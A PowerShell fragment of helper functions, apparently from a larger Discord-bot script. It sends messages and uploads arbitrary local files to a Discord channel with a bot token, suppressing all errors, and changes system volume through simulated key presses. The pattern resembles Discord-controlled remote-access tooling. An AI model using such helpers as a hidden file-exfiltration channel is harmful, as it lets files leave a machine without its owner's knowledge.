# 2. Helper Functions
function Send-Text($content) {
$body = @{ content = $content } | ConvertTo-Json
$h = $Headers.Clone()
$h["Content-Type"] = "application/json"
try { Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$ChannelID/messages" -Method Post -Headers $h -Body $body | Out-Null } catch {}
}

function Send-File($filePath) {
try { curl.exe -s -H "Authorization: Bot $Token" -F "file=@$filePath" "https://discord.com/api/v10/channels/$ChannelID/messages" | Out-Null } catch {}
}

function Set-Volume($level) {
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Vol {
[DllImport("user32.dll")]
public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
}
"@
if ($level -gt 50) {
for ($i = 0; $i -lt 50; $i++) { [Vol]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
$target = [math]::Round(($level - 50) / 2)
for ($i = 0; $i -lt $target; $i++) { [Vol]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
} else {
for ($i = 0; $i -lt 50; $i++) { [Vol]::keybd_event(0xAE, 0, 0, [UIntPtr]::Zero) }
$target = [math]::Round((50 - $level) / 2)
for ($i = 0; $i -lt $target; $i++) { [Vol]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
}
}
